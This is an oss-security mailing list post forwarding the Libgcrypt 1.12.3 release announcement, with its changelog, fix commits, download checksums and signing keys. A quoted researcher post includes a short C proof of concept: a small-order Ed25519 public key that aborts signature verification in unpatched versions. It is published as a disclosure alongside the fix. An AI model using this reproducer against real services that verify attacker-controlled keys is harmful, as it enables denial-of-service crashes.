X-Archive-Source: openwall-scrape
X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/08/31/8
Message-ID: <87mru2l9m6.fsf@gentoo.org>
Date: Mon, 31 Aug 2026 14:09:37 +0100
From: Sam James <sam@...too.org>
To: oss-security@...ts.openwall.com
Subject: Fwd: [Announce] Libgcrypt 1.12.3 released
Content-Type: text/plain; charset=utf-8


I can't reach GnuPG's bug tracker at the moment so I can't check
the mentioned bugs (if they're even public, I don't know) to see if
they have the security impact I assume they might based on the
description below.

One thing I did see, however, is this from Lukasz Olejnik on X [0]:

Quoting the X post [0] I mention in the first comment:
"""
I reported this security bug to libgcrypt. The bug allowed an attacker
to supply a degenerate/small-order Ed25519 public key that passes the
initial curve check but triggers a fatal log_bug during signature
verification, aborting the entire process. This enables a reliable
denial-of-service against applications verifying attacker-controlled
keys/signatures, without requiring a valid signature.

I attach a reproducer:
#include <gcrypt.h>

static int triggerAbort(void)
{
    static const unsigned char identity[32] = {0x01};
    static const unsigned char zero[32] = {0};
    static const unsigned char encodedKey[33] = {0x40, 0x01};
    gcry_sexp_t publicKey;
    gcry_sexp_t message;
    gcry_sexp_t signature;

    gcry_check_version(NULL);
    gcry_sexp_build(
        &publicKey, NULL,
        "(public-key(ecc(curve Ed25519)(flags eddsa)(q %b)))",
        (int)sizeof(encodedKey), encodedKey);
    gcry_sexp_build(
        &message, NULL,
        "(data(flags eddsa)(hash-algo sha512)(value %b))",
        0, identity);
    gcry_sexp_build(
        &signature, NULL,
        "(sig-val(eddsa(r %b)(s %b)))",
        32, identity, 32, zero);

    return gcry_pk_verify(signature, message, publicKey);
}

int main(void)
{
    return triggerAbort();
}
"""

This release fixes that testcase.

Finally, there are some post-release commits which may also be
security-relevant:

commit 3ed69d3fb85bac0901dc5b4899d7983cf1f7bbe7
Author:     NIIBE Yutaka <gniibe@...j.org>
AuthorDate: Fri Aug 28 15:25:22 2026 +0900
Commit:     NIIBE Yutaka <gniibe@...j.org>
CommitDate: Fri Aug 28 15:25:22 2026 +0900

    cipher:rsa:pss: Fix SALT-LENGTH handling.

    * cipher/pubkey-util.c (_gcry_pk_util_data_to_mpi): For
    PUBKEY_OP_SIGN, just like for PUBKEY_OP_VERIFY, reject larger
    SALT-LENGTH as the comment says.  Fix releasing LIST on error.

    --

    Fixes-commit: 0bd8137e68c201b6c2290710e348aaf57efa2b2e
    GnuPG-bug-id: 8377
    Reported-by: JEAN Jeremy <Jeremy.Jean@....gouv.fr>
    Signed-off-by: NIIBE Yutaka <gniibe@...j.org>

commit 612eb8c157c057feeaf17d30644fd65b05c5ea25
Author:     NIIBE Yutaka <gniibe@...j.org>
AuthorDate: Thu Aug 27 14:36:35 2026 +0900
Commit:     NIIBE Yutaka <gniibe@...j.org>
CommitDate: Thu Aug 27 14:40:17 2026 +0900

    cipher:rsa:pss: Validate the length of hashed input.

    * cipher/rsa-common.c (_gcry_rsa_pss_verify): Reject invalid input.

    --

    GnuPG-bug-id: 8391
    Reported-by: JEAN Jeremy <Jeremy.Jean@....gouv.fr>
    Signed-off-by: NIIBE Yutaka <gniibe@...j.org>

commit cf55ce42d0268f9cfd7abc43aa4ec62d2e8c3f53
Author:     NIIBE Yutaka <gniibe@...j.org>
AuthorDate: Thu Aug 27 13:47:19 2026 +0900
Commit:     NIIBE Yutaka <gniibe@...j.org>
CommitDate: Thu Aug 27 13:47:19 2026 +0900

    cipher:rsa:oaep: Validate all-zero PS.

    * cipher/rsa-common.c (_gcry_rsa_oaep_decode): Reject non-zero PS.

    --

    GnuPG-bug-id: 8390
    Reported-by: JEAN Jeremy <Jeremy.Jean@....gouv.fr>
    Signed-off-by: NIIBE Yutaka <gniibe@...j.org>

[0] https://x.com/lukOlejnik/status/2093348278511219044

-------------------- Start of forwarded message --------------------
To: gnupg-announce@...pg.org
Date: Thu, 27 Aug 2026 10:26:55 +0200
Subject: [Announce] Libgcrypt 1.12.3 released
From: Werner Koch via Gnupg-announce <gnupg-announce@...pg.org>
Cc: Werner Koch <wk@...pg.org>, info-gnu@....org


Hello!

We are pleased to announce the availability Libgcrypt version 1.12.3.
This version fixes a couple of minor bugs, introduces an additional name
for an existing curve, and provides some performance improvements.


Noteworthy changes in version 1.12.3 (2026-08-26)  [C28/A8/R0]
=================================================

 * Bug fixes:

   - Avoid theoretical drive-by loading of netapi32.dll and
     shell32.dll.  [T8375]

   - Validate hash algorithm for use with RSA modulus.  [T8376]

   - Validate parameters of Balloon KDF.  [T8374,T8383]

   - Validate parallelism of Argon2 KDF.  [T8373,T8382]

   - Fix parsing quoted parts and CRLF/LFCR in s-expression.  [T8371]

   - Support BUFLEN check for GCRYMPI_FMT_SSH.  [T8371]

   - Fix RSA PSS verify message length checking.  [rC0d64fc228f]

   - Avoid a NULL ptr deref due to a unsupported genkey flag for
     ECC.  [rC3b259530bc]

   - Assert 32 KiB input cap in gcm_ctr_encrypt.  [T8387]

   - Fix assertion failure in OCB when a buffered block becomes block
     65536.  [T8389]

   - Fix OOB read in IMIT MAC verify of GOST28147.  [T8388]

   - Fix CMAC block-count truncation for 64 GiB writes.  [T8384]

   - Fix AEAD spurious byte-counter carry for 4 GiB adds.  [T8381]

   - Validate all KEM input lengths.  [T8259]

   - Add length check of DATALEN when parsing s-expression.  [T8267]

   - Only accept canonical value for S with EdDSA.  [T8386]

   - Only accept canonical signatures for RSA.  [T8392]

   - Fix an assertion failure for invalid small-order Ed25519 public
     keys.  [T8380]

   - Validate length of supplied receiver public-key length in DHKEM
     decapsulation.  [T8385]

   - Use a more strict value for the PKCS#1 minimal frame length.
     [T8393,T8394]

 * Performance:

   - Use just strong random for the Dilithium signature nonce and the
     Kyber encapsulation coins.  [rC70ecc4e943,rCd7a3acc130]

   - Allow internal users to skip fast random poll for ciphers and
     hashes.  [rC75ff7a959b]

   - Speedup sntrup761 by defer reduction in polynomial multiplication,
     reading random with a single call, and reducing freeze helpers
     w/o division.  [rCbaa3a6376b,rC3f2f39bf75,rC317c661b16]

   - Avoid byte-wise load/store on RISC-V with Zicclsm.
     [rCe18a5eb650]

   - Use unaligned vector memory access on RSIV-V when supported.
     [rCecaa3572e1]

   - Add Intel SM4 instructions accelerated AVX512 and AVX2
     implementation.  [rC14d1a882aa,rCdf44b486ba]

   - Add Intel SM3 extension implementation.  [rC3f94b92e05]

   - Add Intel SHA512 extension implementation.  [rC0f8a34038d]

 * Other:

   - kyber: Accept and return a seed using the gcry_pk_genkey API.
     [rCe099ccfea9]

   - Add curve "ietf25" as alternative to "Curve25519" with exact
     RFC-8410 semantics.  The name "X25519" was already used as an
     alias, thus this new name.  [rC997217e600]

   - Add straight-line speculation hardening for function ends.
     [rC9b684f4a44]

   - Fix constant time memequal check for SM2.  [T8395]

   - Add post-quantum algorithm benchmarking to bench-slope.

   - Due to the minor API updates and but with no newer branch
     released the SO name has been updated.

 Release-info: https://dev.gnupg.org/T8223

 Note that due to ongoing DoS our dev.gnupg.org server may not be
 reachable or has been blocked for some IP address ranges.


Download
========

Source code is hosted at the GnuPG FTP server and its mirrors as listed
at https://gnupg.org/download/mirrors.html.  On the primary server
the source tarball and its digital signature are:

 https://gnupg.org/ftp/gcrypt/libgcrypt/libgcrypt-1.12.3.tar.bz2
 https://gnupg.org/ftp/gcrypt/libgcrypt/libgcrypt-1.12.3.tar.bz2.sig

or gzip compressed:

 https://gnupg.org/ftp/gcrypt/libgcrypt/libgcrypt-1.12.3.tar.gz
 https://gnupg.org/ftp/gcrypt/libgcrypt/libgcrypt-1.12.3.tar.gz.sig

In order to check that the version of Libgcrypt you downloaded is an
original and unmodified file please follow the instructions found at
https://gnupg.org/download/integrity_check.html.  In short, you may
use one of the following methods:

 - Check the supplied OpenPGP signature.  For example to check the
   signature of the file libgcrypt-1.12.3.tar.bz2 you would use this
   command:

     gpg --verify libgcrypt-1.12.3.tar.bz2.sig libgcrypt-1.12.3.tar.bz2

   This checks whether the signature file matches the source file.
   You should see a message indicating that the signature is good and
   made by one or more of the release signing keys.  Make sure that
   this is a valid key, either by matching the shown fingerprint
   against a trustworthy list of valid release signing keys or by
   checking that the key has been signed by trustworthy other keys.
   See the end of this mail for information on the signing keys.

 - If you are not able to use an existing version of GnuPG, you have
   to verify the SHA-1 checksum.  On Unix systems the command to do
   this is either "sha1sum" or "shasum".  Assuming you downloaded the
   file libgcrypt-1.12.3.tar.bz2, you run the command like this:

     sha1sum libgcrypt-1.12.3.tar.bz2

   and check that the output matches the first line from the
   this list:

b4654d75f0e5d0850cc699f02c9b44a06367502f  libgcrypt-1.12.3.tar.bz2
e224bd8fe6709ef1471eefed35468fd1f4b9d3cc  libgcrypt-1.12.3.tar.gz

   You should also verify that the checksums above are authentic by
   matching them with copies of this announcement.  Those copies can be
   found at other mailing lists, web sites, and search engines.


Copying
=======

Libgcrypt is distributed under the terms of the GNU Lesser General
Public License (LGPLv2.1+).  The helper programs as well as the
documentation are distributed under the terms of the GNU General Public
License (GPLv2+).  The file LICENSES has notices about contributions
that require that these additional notices are distributed.


Support
=======

For help on developing with Libgcrypt you should read the included
manual and if needed ask on the gcrypt-devel mailing list.

In case of problems specific to this release please first check
https://dev.gnupg.org/T8223 for updated information.

Please also consult the archive of the gcrypt-devel mailing list before
reporting a bug: https://gnupg.org/documentation/mailing-lists.html .
We suggest to send bug reports for a new release to this list in favor
of filing a bug at https://dev.gnupg.org.  If you need commercial
support go to https://gnupg.com or https://gnupg.org/service.html .

Please see https://gnupg.org/documentation/security.html for information
on how to report security issues and for our threat model.

If you are a developer and you need a certain feature for your project,
please do not hesitate to bring it to the gcrypt-devel mailing list for
discussion.


Thanks
======

Since 2001 maintenance and development of GnuPG is done by g10 Code GmbH
and has mostly been financed by donations.  Several full-time employed
developers and contractors are working exclusively on GnuPG and closely
related software like Libgcrypt, GPGME, Kleopatra and Gpg4win.

Fortunately, and this is still not common with free software, we have
now established a way of financing the development while keeping all our
software free and freely available for everyone.  Our model is similar
to the way RedHat manages RHEL and Fedora: Except for the actual binary
of the MSI installer for Windows and client specific configuration
files, all the software is available under the GNU GPL and other Open
Source licenses.  Thus customers may even build and distribute their own
version of the software as long as they do not use our trademarks
GnuPG Desktop® or GnuPG VS-Desktop®.

We like to thank all the nice people who are helping the GnuPG project,
be it testing, coding, translating, suggesting, auditing, administering
the servers, spreading the word, answering questions on the mailing
lists, or helping with donations.

*Thank you all*

   Your Libgcrypt hackers



p.s.
This is an announcement only mailing list.  Please send replies only to
the gcrypt-devel'at'gnupg.org mailing list.

* List of Release Signing Keys:
  To guarantee that a downloaded version has not been tampered by
  malicious entities we provide signature files for all tarballs and
  binary versions.  The keys are also signed by the long term keys of
  their respective owners.  Current releases are signed by one or more
  of these five keys:

    ed25519 2020-08-24 [SC] [expires: 2030-06-30]
    6DAA 6E64 A76D 2840 571B  4902 5288 97B8 2640 3ADA
    Werner Koch (dist signing 2020)

    ed25519 2021-05-19 [SC] [expires: 2027-04-04]
    AC8E 115B F73E 2D8D 47FA  9908 E98E 9B2D 19C6 C8BD
    Niibe Yutaka (GnuPG Release Key)

    rsa3072 2025-05-09 [SC] [expires: 2033-03-03]
    3B76 1AE4 E63B F351 9CE7  D63B ECB6 64CB E133 2EEF
    Alexander Kulbartsch (GnuPG Release Key)

    ed25519 2026-07-20 [SC] [expires: 2036-06-30]
    D02A E491 73BD AD56 E4F8  8223 707E 56D3 DEF4 115C
    Ingo Klöcker (Release Signing Key 2026)
  
    brainpoolP256r1 2021-10-15 [SC] [expires: 2029-12-31]
    02F3 8DFF 731F F97C B039  A1DA 549E 695E 905B A208
    GnuPG.com (Release Signing Key 2021)

    brainpoolP384r1 2026-02-23 [SC] [expires: 2034-02-23]
    1493 269D E61F 124A A69A  316E 3ADF 34EB DBB2 00A4
    GnuPG.com (Release Signing Key 2026)

  The keys are available at https://gnupg.org/signature_key.html and in
  any recently released GnuPG tarball in the file g10/distsigkey.gpg .
  Note that this mail has been signed by a different key.

* Debian Package Signing Key:
  The new Debian style packages are signed using this key:

    ed25519 2025-07-08 [SC] [expires: 2035-07-14]
    3209 7B71 9B37 45D6 E61D DA1B 85C4 5AE3 E1A2 B355
    GnuPG.org Package Signing Key <package-maintainers@...pg.org>

  See the package website (https://repos.gnupg.org/deb/gnupg) for a list
  of supported distributions and a download link for the key.

-- 
Arguing that you don't care about the right to privacy because you have
nothing to hide is no different from saying you don't care about free
speech because you have nothing to say.                - Edward Snowden


Download attachment "openpgp-digital-signature.asc" of type "application/pgp-signature" (284 bytes)

_______________________________________________
Gnupg-announce mailing list
Gnupg-announce@...pg.org
http://lists.gnupg.org/mailman/listinfo/gnupg-announce


-------------------- End of forwarded message --------------------


Download attachment "signature.asc" of type "application/pgp-signature" (419 bytes)
